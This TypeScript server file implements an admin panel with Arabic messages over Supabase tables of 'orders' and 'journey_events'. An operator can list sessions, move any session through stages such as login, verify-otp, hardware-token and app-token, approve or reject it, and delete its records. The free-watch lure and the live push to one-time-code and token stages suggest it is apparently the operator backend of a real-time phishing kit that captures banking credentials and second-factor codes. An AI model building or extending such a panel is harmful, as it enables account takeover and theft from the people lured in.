import { createServerFn } from "@tanstack/react-start";
import { z } from "zod";

const credsSchema = z.object({
  username: z.string().min(1).max(80),
  password: z.string().min(1).max(200),
});

function verifyCreds(u: string, p: string) {
  const U = process.env["ADMIN_USERNAME"];
  const P = process.env["ADMIN_PASSWORD"];
  if (!U || !P) throw new Error("لم يتم ضبط بيانات المدير");
  return u === U && p === P;
}

export const adminLogin = createServerFn({ method: "POST" })
  .inputValidator((raw: unknown) => credsSchema.parse(raw))
  .handler(async ({ data }) => {
    if (!verifyCreds(data.username, data.password)) {
      throw new Error("بيانات الدخول غير صحيحة");
    }
    return { ok: true };
  });

export const adminListAll = createServerFn({ method: "POST" })
  .inputValidator((raw: unknown) => credsSchema.parse(raw))
  .handler(async ({ data }) => {
    if (!verifyCreds(data.username, data.password)) {
      throw new Error("غير مصرح");
    }
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    const [{ data: orders }, { data: events }] = await Promise.all([
      supabaseAdmin.from("orders").select("*").order("updated_at", { ascending: false }).limit(200),
      supabaseAdmin
        .from("journey_events")
        .select("*")
        .order("created_at", { ascending: false })
        .limit(300),
    ]);
    return { orders: orders ?? [], events: events ?? [] };
  });

const setStageSchema = credsSchema.extend({
  sessionId: z.string().min(4).max(80),
  stage: z.enum([
    "select-watch",
    "register",
    "login",
    "verify-otp",
    "hardware-token",
    "app-token",
    "processing",
  ]),
});

export const adminSetStage = createServerFn({ method: "POST" })
  .inputValidator((raw: unknown) => setStageSchema.parse(raw))
  .handler(async ({ data }) => {
    if (!verifyCreds(data.username, data.password)) throw new Error("غير مصرح");
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    await supabaseAdmin
      .from("orders")
      .update({ stage: data.stage })
      .eq("session_id", data.sessionId);
    await supabaseAdmin.from("journey_events").insert({
      session_id: data.sessionId,
      stage: `admin:redirect:${data.stage}`,
      payload: null,
    });
    return { ok: true };
  });

const setStatusSchema = credsSchema.extend({
  sessionId: z.string().min(4).max(80),
  status: z.enum(["new", "approved", "rejected", "review"]),
});

export const adminSetStatus = createServerFn({ method: "POST" })
  .inputValidator((raw: unknown) => setStatusSchema.parse(raw))
  .handler(async ({ data }) => {
    if (!verifyCreds(data.username, data.password)) throw new Error("غير مصرح");
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    await supabaseAdmin
      .from("orders")
      .update({ status: data.status })
      .eq("session_id", data.sessionId);
    return { ok: true };
  });

const delSchema = credsSchema.extend({ sessionId: z.string().min(4).max(80) });

export const adminDelete = createServerFn({ method: "POST" })
  .inputValidator((raw: unknown) => delSchema.parse(raw))
  .handler(async ({ data }) => {
    if (!verifyCreds(data.username, data.password)) throw new Error("غير مصرح");
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    await supabaseAdmin.from("journey_events").delete().eq("session_id", data.sessionId);
    await supabaseAdmin.from("orders").delete().eq("session_id", data.sessionId);
    return { ok: true };
  });
